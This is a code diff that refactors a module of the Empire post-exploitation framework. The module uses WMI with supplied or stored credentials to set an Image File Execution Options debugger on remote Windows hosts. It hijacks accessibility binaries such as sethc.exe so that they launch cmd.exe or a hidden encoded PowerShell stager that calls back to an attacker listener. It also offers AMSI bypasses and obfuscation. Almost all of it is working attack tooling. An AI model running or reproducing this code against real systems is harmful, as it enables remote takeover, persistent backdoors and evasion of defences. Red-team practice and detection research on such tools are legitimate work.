@@ -1,236 +1,122 @@
 from __future__ import print_function
 
-from builtins import object
 from builtins import str
-
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Invoke-WMIDebugger',
-
-            'Author': ['@harmj0y'],
-
-            'Description': ('Uses WMI to set the debugger for a target binary on a remote '
-                            'machine to be cmd.exe or a stager.'),
-
-            'Software': '',
-
-            'Techniques': ['T1047'],
-
-            'Background' : False,
-
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : False,
-
-            'OpsecSafe' : False,
-
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
-            
-            'Comments': []
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'CredID' : {
-                'Description'   :   'CredID from the store to use.',
-                'Required'      :   False,
-                'Value'         :   ''                
-            },
-            'ComputerName' : {
-                'Description'   :   'Host[s] to execute the stager on, comma separated.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Obfuscate': {
-                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'ObfuscateCommand': {
-                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
-                'Required': False,
-                'Value': r'Token\All\1'
-            },
-            'AMSIBypass': {
-                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'True'
-            },
-            'AMSIBypass2': {
-                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'UserName' : {
-                'Description'   :   r'[domain\]username to use to execute command.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Password' : {
-                'Description'   :   'Password to use to execute command.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'TargetBinary' : {
-                'Description'   :   'Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)',
-                'Required'      :   True,
-                'Value'         :   'sethc.exe'
-            },
-            'RegPath' : {
-                'Description'   :   'Registry location to store the script code. Last element is the key name.',
-                'Required'      :   False,
-                'Value'         :   r'HKLM:Software\Microsoft\Network\debug'
-            },
-            'Binary' : {
-                'Description'   :   'Binary to set for the debugger.',
-                'Required'      :   False,
-                'Value'         :   r'C:\Windows\System32\cmd.exe'
-            },
-            'Cleanup' : {
-                'Description'   :   'Switch. Disable the debugger for the specified TargetBinary.',
-                'Required'      :   False,
-                'Value'         :   ''
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         
         script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""
         # Set booleans to false by default
-        Obfuscate = False
-        AMSIBypass = False
-        AMSIBypass2 = False
+        obfuscate = False
+        amsi_bypass = False
+        amsi_bypass2 = False
 
         # management options
-        cleanup = self.options['Cleanup']['Value']        
-        binary = self.options['Binary']['Value']
-        targetBinary = self.options['TargetBinary']['Value']
-        listenerName = self.options['Listener']['Value']
-        userName = self.options['UserName']['Value']
-        password = self.options['Password']['Value']
-        if (self.options['Obfuscate']['Value']).lower() == 'true':
-            Obfuscate = True
-        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
-        if (self.options['AMSIBypass']['Value']).lower() == 'true':
-            AMSIBypass = True
-        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
-            AMSIBypass2 = True
+        cleanup = params['Cleanup']
+        binary = params['Binary']
+        target_binary = params['TargetBinary']
+        listener_name = params['Listener']
+        username = params['UserName']
+        password = params['Password']
+        if (params['Obfuscate']).lower() == 'true':
+            obfuscate = True
+        obfuscate_command = params['ObfuscateCommand']
+        if (params['AMSIBypass']).lower() == 'true':
+            amsi_bypass = True
+        if (params['AMSIBypass2']).lower() == 'true':
+            amsi_bypass2 = True
 
         # storage options
-        regPath = self.options['RegPath']['Value']
+        reg_path = params['RegPath']
 
-        statusMsg = ""
-        locationString = ""
+        status_msg = ""
+        location_string = ""
 
         # if a credential ID is specified, try to parse
-        credID = self.options["CredID"]['Value']
-        if credID != "":
+        cred_id = params["CredID"]
+        if cred_id != "":
             
-            if not self.mainMenu.credentials.is_credential_valid(credID):
+            if not main_menu.credentials.is_credential_valid(cred_id):
                 print(helpers.color("[!] CredID is invalid!"))
                 return ""
 
-            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
+            (cred_id, credType, domain_name, username, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]
 
-            if domainName != "":
-                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
+            if domain_name != "":
+                params["UserName"] = str(domain_name) + "\\" + str(username)
             else:
-                self.options["UserName"]['Value'] = str(userName)
+                params["UserName"] = str(username)
             if password != "":
-                self.options["Password"]['Value'] = passw = password
+                params["Password"] = passw = password
 
 
         if cleanup.lower() == 'true':
             # the registry command to disable the debugger for the target binary
-            payloadCode = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';"
-            statusMsg += " to remove the debugger for " + targetBinary
+            payload_code = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';"
+            status_msg += " to remove the debugger for " + target_binary
 
-        elif listenerName != '':
+        elif listener_name != '':
             # if there's a listener specified, generate a stager and store it
-            if not self.mainMenu.listeners.is_listener_valid(listenerName):
+            if not main_menu.listeners.is_listener_valid(listener_name):
                 # not a valid listener, return nothing for the script
-                print(helpers.color("[!] Invalid listener: " + listenerName))
+                print(helpers.color("[!] Invalid listener: " + listener_name))
                 return ""
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
+                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True, obfuscate=obfuscate, obfuscationCommand=obfuscate_command,AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
                 
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
 
-            path = "\\".join(regPath.split("\\")[0:-1])
-            name = regPath.split("\\")[-1]
+            path = "\\".join(reg_path.split("\\")[0:-1])
+            name = reg_path.split("\\")[-1]
 
             # statusMsg += " stored in " + regPath + "."
 
-            payloadCode = "$RegPath = '"+regPath+"';"
-            payloadCode += "$parts = $RegPath.split('\\');"
-            payloadCode += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
-            payloadCode += "$name = $parts[-1];"
-            payloadCode += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"
+            payload_code = "$RegPath = '"+reg_path+"';"
+            payload_code += "$parts = $RegPath.split('\\');"
+            payload_code += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
+            payload_code += "$name = $parts[-1];"
+            payload_code += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"
 
             # note where the script is stored
-            locationString = "$((gp "+path+" "+name+")."+name+")"
+            location_string = "$((gp "+path+" "+name+")."+name+")"
 
-            payloadCode += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';"
+            payload_code += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+location_string+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';"
 
-            statusMsg += " to set the debugger for "+targetBinary+" to be a stager for listener " + listenerName + "."
+            status_msg += " to set the debugger for "+target_binary+" to be a stager for listener " + listener_name + "."
 
         else:
-            payloadCode = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+binary+"';"
+            payload_code = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '"+binary+"';"
             
-            statusMsg += " to set the debugger for "+targetBinary+" to be " + binary + "."
+            status_msg += " to set the debugger for "+target_binary+" to be " + binary + "."
 
         # unicode-base64 the payload code to execute on the targets with -enc
-        encPayload = helpers.enc_powershell(payloadCode)
+        encPayload = helpers.enc_powershell(payload_code)
 
         # build the WMI execution string
-        computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""
+        computer_names = "\"" + "\",\"".join(params['ComputerName'].split(",")) + "\""
 
-        script += " -ComputerName @("+computerNames+")"
+        script += " -ComputerName @("+computer_names+")"
         script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload.decode('UTF-8') + "\""
 
         # if we're supplying alternate user credentials
-        if userName != '':
-            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"
+        if username != '':
+            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+username+"\",$PSPassword);" + script + " -Credential $Credential"
 
-        script += ";'Invoke-Wmi executed on " +computerNames + statusMsg+"'"
+        script += ";'Invoke-Wmi executed on " +computer_names + status_msg+"'"
 
         script = helpers.keyword_obfuscation(script)
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
         script = helpers.keyword_obfuscation(script)
 
         return script
